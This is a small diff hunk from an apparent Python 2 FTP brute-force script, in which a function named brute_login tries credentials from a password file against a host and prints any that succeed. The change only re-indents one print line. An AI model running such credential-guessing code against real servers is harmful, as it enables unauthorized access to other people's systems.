@@ -26,7 +26,7 @@ def brute_login(hostname, password_file):
             ftp = ftplib.FTP(hostname)
             ftp.login(username, password)
             print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + \
-                                            + username + '/' + password
+                                           + username + '/' + password
             ftp.quit()
             return (username, password)
         except Exception, e:
